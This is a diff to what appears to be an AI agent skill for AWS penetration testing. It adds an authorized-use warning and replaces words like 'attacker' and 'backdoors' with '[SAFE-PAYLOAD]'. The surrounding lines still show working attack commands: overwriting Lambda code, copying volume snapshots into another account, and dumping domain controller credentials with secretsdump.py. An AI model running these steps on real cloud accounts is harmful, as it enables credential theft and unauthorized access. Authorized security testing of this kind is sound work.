@@ -1,13 +1,16 @@
 ---
 name: aws-penetration-testing
 description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
 # AWS Penetration Testing
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
 
 ## Purpose
 
@@ -191,7 +194,7 @@ def lambda_handler(event, context):
 ```bash
 # Update Lambda code
 aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+  --zip-file fileb://[SAFE-PAYLOAD].zip
 ```
 
 ---
@@ -278,7 +281,7 @@ aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
 # Create volume from snapshot
 aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
 
-# Attach to attacker instance
+# Attach to [SAFE-PAYLOAD] instance
 aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
 
 # Mount and access
@@ -291,8 +294,8 @@ sudo mount /dev/xvdf1 /mnt/stolen
 ```bash
 # CloudCopy technique
 # 1. Create snapshot of DC volume
-# 2. Share snapshot with attacker account
-# 3. Mount in attacker instance
+# 2. Share snapshot with [SAFE-PAYLOAD] account
+# 3. Mount in [SAFE-PAYLOAD] instance
 # 4. Extract NTDS.dit and SYSTEM
 secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
 ```
@@ -356,7 +359,7 @@ aws cloudtrail update-trail --name trail_name \
 
 **Must Not:**
 - Modify production data without approval
-- Leave persistent backdoors without documentation
+- Leave persistent [SAFE-PAYLOAD] without documentation
 - Disable security controls permanently
 
 **Should:**
